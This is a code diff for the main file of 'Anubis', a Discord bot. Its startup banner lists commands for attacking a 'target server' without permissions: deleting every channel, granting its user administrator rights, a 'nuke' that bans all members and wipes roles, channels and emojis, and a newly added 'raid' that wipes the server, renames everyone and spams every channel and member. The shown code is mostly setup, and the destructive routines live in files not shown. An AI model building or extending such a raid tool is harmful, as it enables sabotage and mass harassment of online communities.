@@ -1,7 +1,9 @@
 # Scripted by Catterall (https://github.com/Catterall).
 # Bot under the GNU General Public Liscense v2 (1991).
 
+
 # Modules
+
 import discord
 import os
 import json
@@ -9,9 +11,11 @@ import asyncpg
 import random as r
 from discord.ext import commands, tasks
 from itertools import cycle
-from colorama import *
+from colorama import Style, Back, Fore, init
+init()
 
-init()  # Used by colorama.
+
+# Message to be displayed if an error is encountered when starting the bot.
 
 def startError():
     print(Fore.BLUE + f'''
@@ -41,19 +45,22 @@ def startError():
 {Fore.YELLOW}Thank you for using Anubis and apologies for all errors encountered! -Catterall.
 '''.replace('█', f'{Fore.WHITE}█{Fore.BLUE}'))
     close = input("")
-    os._exit(1)
+    return
 
-#  Attempts to regenerate any lost JSON files.
+
+#  Regenerate JSON file if lost.
+
 try:
-    with open('run_settings.json', 'r') as file:
-        data = json.load(file)
+    with open('run_settings.json', 'r') as f:
+        data = json.load(f)
 except FileNotFoundError:
     data = {}
     data["postgresql_password"] = "Replace this text with the postgresql password you set"
     data["prefix"] = "a!"
     data["token"] = "Replace this text with your bot token"
-    with open('run_settings.json', 'w') as file:
-        json.dump(data, file, indent=4)
+    with open('run_settings.json', 'w') as f:
+        json.dump(data, f, indent=4)
+        f.close()
 
 if os.path.isfile('cogs/temp.txt'):
     os.remove('cogs/temp.txt')
@@ -63,18 +70,25 @@ with open('cogs/temp.txt', 'w') as f:
     f.write(str(leave_code))
     f.close()
 
-# Sets the bot prefix to the prefix specified in the JSON file (default prefix = "a!").
+# Sets the bot prefix to the prefix specified in the JSON file.
+
 if data.get("prefix").strip().replace(" ", "") == "":
     startError()
-bot = commands.Bot(command_prefix=data.get("prefix"))
-# Used in "change_status()".
+else:
+    bot = commands.Bot(command_prefix=data.get("prefix"))
+
+# Status' to be cycled continously as the bot runs.
+# You add or change these status' here - make sure to have at least one.
+
 status = cycle(['against raiders!', f'{data.get("prefix")}help for commands!'])
 
-# Removes default help command.
+# Removes the default help command (Help command is replaced by an embed further down in the code).
+
 bot.remove_command('help')
 
 
-# Creates the database pool from the database "levels_db" set up in installation (See README.md).
+# Creates the database pool from the postresql database "levels_db" set up in the installation (See README.md).
+
 async def create_db_pool():
     try:
         bot.pg_con = await asyncpg.create_pool(database="levels_db", user="postgres", password=data.get("postgresql_password"))
@@ -83,6 +97,7 @@ async def create_db_pool():
 
 
 # Load/Unload/Reload: Used for messing with Cogs.
+
 @bot.command()
 async def load(ctx, extension):
     bot.load_extension(f'cogs.{extension}')
@@ -109,19 +124,18 @@ async def reload(ctx, extension):
 
 
 # On ready.
+
 @bot.event
 async def on_ready():
     global leave_code
     change_status.start()
-    print(Fore.BLUE + f'''
-     
-                                    █████╗ ███╗   ██╗██╗   ██╗██████╗ ██╗███████╗
-                                    ██╔══██╗████╗  ██║██║   ██║██╔══██╗██║██╔════╝
+    print(Fore.BLUE + f'''     
+                                    ███████╗███╗   ██╗██╗   ██╗██████╗ ██╗███████╗
+                                    ██╔══██║████╗  ██║██║   ██║██╔══██╗██║██╔════╝
                                     ███████║██╔██╗ ██║██║   ██║██████╔╝██║███████╗
                                     ██╔══██║██║╚██╗██║██║   ██║██╔══██╗██║╚════██║
                                     ██║  ██║██║ ╚████║╚██████╔╝██████╔╝██║███████║
                                     ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚═╝╚══════╝
-
 
 {Fore.WHITE}{Back.BLUE}The following commands can be used in any text channel within the target server - permissions are not needed:
 {Back.RESET}{Style.DIM}{Fore.RED}{data.get('prefix')}leave <leave-code> <server>: Makes the bot leave a server (Your current leave code is {Fore.WHITE}{leave_code}{Fore.RED}).
@@ -131,6 +145,9 @@ async def on_ready():
 {Fore.BLUE}{data.get('prefix')}cpurge: Delete all channels on a server.
 {Style.DIM}{Fore.MAGENTA}{data.get('prefix')}admin <role_name>: Gain administrator privileges on a server via an admin role created by the bot.
 {Style.BRIGHT}{Fore.LIGHTMAGENTA_EX}{data.get('prefix')}nuke: Ban all members, then delete all roles, then delete all channels, then delete all custom emojis on a server.
+{Style.DIM}{Fore.RED}{data.get('prefix')}raid <role_name> <nickname> <channel_name> <num_of_channels> <message>:
+Delete all channels, then delete all roles, then give everyone a new role, then nickname everyone a new nickname,
+then create x number of channels, then message everyone with a message, then spam all channels with a message.
 
 
 {Style.DIM}{Fore.GREEN}Additional notes:
@@ -139,11 +156,11 @@ members you wish to ban (i.e. move the role as high as possible).
 
 {Fore.LIGHTCYAN_EX}To refresh this window back to this page, use the command: {Fore.LIGHTGREEN_EX}{data.get('prefix')}refresh
 
-
-{Fore.LIGHTRED_EX}Anubis created by Catterall (View for full guide): {Fore.WHITE}https://www.github.com/Catterall\n{Style.DIM}{Fore.RED}'''.replace('█', f'{Fore.WHITE}█{Fore.BLUE}'))
+{Fore.LIGHTRED_EX}Anubis created by Catterall (View for full guide): {Fore.WHITE}https://www.github.com/Catterall{Style.DIM}{Fore.RED}'''.replace('█', f'{Fore.WHITE}█{Fore.BLUE}'))
 
 
 # On error (error handling).
+
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.MissingPermissions):
@@ -163,6 +180,7 @@ async def on_command_error(ctx, error):
 
 
 # Help embed.
+
 @bot.command()
 async def help(ctx):
     missing_perms = False
@@ -249,25 +267,32 @@ async def help(ctx):
     await author.send(embed=embed)
 
 
-# Change status every ten seconds.
+# Cycle through status every ten seconds.
+# Change this value to however long you want each status to last (integer).
+
 @tasks.loop(seconds=10)
 async def change_status():
     await bot.change_presence(activity=discord.Game(next(status)))
 
 
 # Search the "Cogs" folder for Cogs.
+
 for filename in os.listdir('./cogs'):
     if filename.endswith('.py'):
         bot.load_extension(f'cogs.{filename[:-3]}')
 
 
-bot.loop.run_until_complete(create_db_pool())  # Asyncio loop.
+# Asycio loop.
 
-# Run the bot using the token specified in the JSON file (if the token is not valid, display an error).
+bot.loop.run_until_complete(create_db_pool())
+
+# Run the bot using the token specified in the JSON file.
+
 try:
     bot.run(data.get("token"))
 except:
     startError()
+    os._exit(1)
 
 # Scripted by Catterall (https://github.com/Catterall).
 # Bot under the GNU General Public Liscense v2 (1991).
